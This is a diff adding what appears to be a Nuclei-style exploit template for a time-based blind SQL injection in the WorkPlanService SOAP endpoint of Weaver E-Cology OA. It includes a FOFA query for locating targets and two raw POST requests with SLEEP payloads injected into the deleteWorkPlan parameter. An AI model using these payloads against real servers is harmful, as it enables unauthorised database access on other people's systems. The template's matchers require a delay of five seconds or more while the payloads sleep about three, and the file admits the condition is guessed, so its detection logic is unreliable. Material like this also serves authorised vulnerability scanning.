@@ -1,0 +1,30 @@
+id: poc-zz2fxugla3vmggfb
+info:
+  name: 泛微E-Cology系统接口WorkPlanService存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zz2fxugla3vmggfb
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zz2fxugla3vmggfb
+    fofa: app="泛微-OA（e-cology）"
+http:
+- raw:
+  - "POST /services/WorkPlanService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36\nContent-Type: text/xml;charset=UTF-8\nConnection: close\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"webservices.workplan.weaver.com.cn\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:deleteWorkPlan>\n         <!--type: string-->\n         <web:in0>(SELECT 8544 FROM(SELECT(SLEEP(3-(IF(27=27,0,5)))))NZeo)</web:in0>\n         <!--type: int-->\n         <web:in1>22</web:in1>\n      </web:deleteWorkPlan>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
+- raw:
+  - "POST /services/WorkPlanService HTTP/1.1\nContent-Length: 430\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nSOAPAction:\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nCookie: ecology_JSessionid=aaawzto5mqug94J9Fz0cz\nConnection: close\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"webservices.workplan.weaver.com.cn\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:deleteWorkPlan>\n         <!--type: string-->\n         <web:in0>(SELECT 1794 FROM (SELECT(SLEEP(3)))xjHS)</web:in0>\n         <!--type: int-->\n         <web:in1>22</web:in1>\n      </web:deleteWorkPlan>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
